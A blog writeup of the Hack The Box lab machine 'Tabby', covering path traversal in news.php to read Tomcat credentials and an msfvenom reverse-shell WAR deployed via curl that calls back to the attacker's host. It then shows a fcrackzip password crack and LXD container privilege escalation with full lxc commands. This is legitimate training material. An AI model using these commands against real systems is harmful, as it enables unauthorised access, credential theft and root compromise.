---
title: "[Writeup] Hack The Box: Tabby"
date: 2020-08-08T23:53:00+07:00
categories: [writeup]
tags: [writeup, walkthrough, htb, hackthebox]
---

Here's my writeup for **Tabby**, a Linux box on Hack The Box. This one is created by **egre55** and it is rated as *Easy*. The techniques required to clear **Tabby** are not complicated, but you need to connect the dots, using information/vulnerabilities from one component to gain access to other components.

![](/images/htb_tabby/info.png)

<!--more-->

**OS:** Linux  
**Difficulty:** Easy  
**Points:** 20  
**Release:** 20 Jun 2020  
**IP:** 10.10.10.194  
**Box Creator:** egre55  
**Date Cleared:** 5 Aug 2020

## TL;DR

- Use path traversal on the `file` variable of `http://10.10.10.194/news.php` to read a credential from `/usr/share/tomcat9/etc/tomcat-users.xml`
- Use the Tomcat credential found to deploy a war file through <http://10.10.10.194:8080/manager/text/deploy>
- Get a reverse shell through the uploaded war web app, and download an encrypted zip file inside `/var/www/html/files`
- Crack the zip password using `fcrackzip` and use that password to `su` to the user `ash`
- Use `lxc` to perform privilege escalation (<https://www.hackingarticles.in/lxd-privilege-escalation/>)

## Information Gathering

Starting with `nmap` scan, there are 3 ports available on the target: `ssh` on `22`, and two `http` servers on `80` and `8080`.

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
8080/tcp open  http    Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 80 - HTTP

The web server on port `80` has a website for **MEGA HOSTING**, a dedicated servers hosting service.

![](/images/htb_tabby/80_home.png)

There is a message mentioning that the company is *recovering from the data breach*, with a link to the statement for that.

I followed the link and it directed me to <http://megahosting.htb/news.php?file=statement>.

![](/images/htb_tabby/host_1.png)

I added the domain name with the IP address of the machine to the `hosts` file at `/etc/hosts` in order to access the page with the domain name. (Or you can just access the page directly without the domain name: <http://10.10.10.194/news.php>)

![](/images/htb_tabby/host_2.png)

The statement is just a simple text saying about the breach. The interesting part is the `file` parameter in the URL.

![](/images/htb_tabby/80_breach.png)

From the look of it, I guessed that `news.php` would get the file name from the `file` parameter and show the content of a file with that same name in a specific directory. I tried to do **path traversal** with `../../../../../` to traverse back to the root directory (`/`) and append the name of the file I wanted to read, and voila! I was able to read `/etc/passwd`.

![](/images/htb_tabby/80_traverse.png)

With this, I could read any arbitrary file *(with sufficient permission)* on the machine given the path, which would surely be useful for the further steps.

### 8080 - HTTP

The port `8080` is hosting **Apache Tomcat**. The home page is a default page with the information on the paths where the components are located at. It also tells that there are the `manager` and `host-manager` web apps available.

![](/images/htb_tabby/8080_tomcat.png)

I tried to log in to both `manager` and `host-manager` using the default passwords, but failed.

![](/images/htb_tabby/8080_manager.png)

![](/images/htb_tabby/8080_hostmanager.png)

However, we do have the ability to read any file on the machine, so why don't we just go ahead and read the config file for Tomcat?

## Gaining Access

With the knowledge of the installation paths from the home page, I searched for the default location of the config file containing the credentials for Tomcat manager. I looked through many paths until I found the package structure of Tomcat 9 from <https://packages.debian.org/sid/all/tomcat9/filelist>.

With that, using the `news.php` from port `80`, I found the credential `tomcat:$3cureP4s5w0rd123!` by accessing <http://megahosting.htb/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml>

![](/images/htb_tabby/80_tomcatpass.png)

I was able to log in to the `host-manager` web app.

![](/images/htb_tabby/8080_hostmanager_success.png)

Unfortunately, I couldn't access the `manager` web app which I needed to deploy a **reverse shell** web app. The reason is that the `tomcat` user does not have the `manager-gui` which is required for accessing the page.

![](/images/htb_tabby/8080_manager_denied.png)

It does, however, have the `manager-script` role, which according to the Tomcat 9 Doc (<https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html>), can use the plaintext interface of the `manager` web app. Therefore, I could deploy a new web app through <http://10.10.10.194:8080/manager/text/deploy>.

![](/images/htb_tabby/tomcat9_doc.png)

I created a reverse shell web app `war` file using the command `msfvenom -p java/jsp_shell_reverse_tcp -f war LHOST=10.10.16.12 LPORT=443 -o rev.war`

![](/images/htb_tabby/reverse_war.png)

I then deployed it to the server with `curl --upload-file rev.war 'http://tomcat:$3cureP4s5w0rd123!@10.10.10.194:8080/manager/text/deploy?path=/rev'`

![](/images/htb_tabby/deploy.png)

With the web app deployed, I could get the reverse shell by opening a listener and access my reverse shell web app at <http://10.10.10.194:8080/rev/>

![](/images/htb_tabby/rev.png)

Spawned a pty with `python3`.

![](/images/htb_tabby/pty.png)

With the shell, I found an interesting zip file in `/var/www/html/files`, so I downloaded it to my machine.

![](/images/htb_tabby/backup.png)

I tried to unzip it and found that the zip is encrypted.

![](/images/htb_tabby/encrypted.png)

With `fcrackzip`, I went for a dictionary attack on the zip file with a common wordlist `rockyou.txt`, and found the password `admin@it`.

`fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip`

![](/images/htb_tabby/fcrackzip.png)

With the right password, I was able to unzip and view the files. However, nothing interesting was found in any of the files.

![](/images/htb_tabby/unzip.png)

From the `/home` directory of the target machine, we can see that there is a user named `ash`.

![](/images/htb_tabby/home.png)

I was able to log in successfully with the password of the zip file, and got the user flag.

![](/images/htb_tabby/user.png)

## Privilege Escalation

The user `ash` is in the `lxd` group, which could be used to deploy a new container.

> LXD is a next generation system container manager. It offers a user experience similar to virtual machines but using Linux containers instead.
> &mdash; <https://linuxcontainers.org/lxd/introduction/>

With that permission, I found a blog (<https://www.hackingarticles.in/lxd-privilege-escalation/>) describing a trick that can be used to escalate the privilege by mounting the **root directory** (`/`) to a container in order to access the files with higher privilege.

I built an image using a script from <https://github.com/saghul/lxd-alpine-builder> and uploaded it to the target machine.

![](/images/htb_tabby/lxc_1.png)

Following the instructions from the blog, I imported the uploaded image, created a container named escalate, mounted the root directory to the container, and started it.

```sh
lxc image import alpine-v3.12-x86_64-20200804_2346.tar.gz --alias alpine
lxc init alpine escalate -c security.privileged=true
lxc config device add escalate whatever disk source=/ path=/mnt/root recursive=true
lxc start escalate
```

![](/images/htb_tabby/lxc_2.png)

I then executed `sh` on the container and got access to all files on the machine, including the root flag.

```
lxc exec escalate sh
cat /mnt/root/root/root.txt
```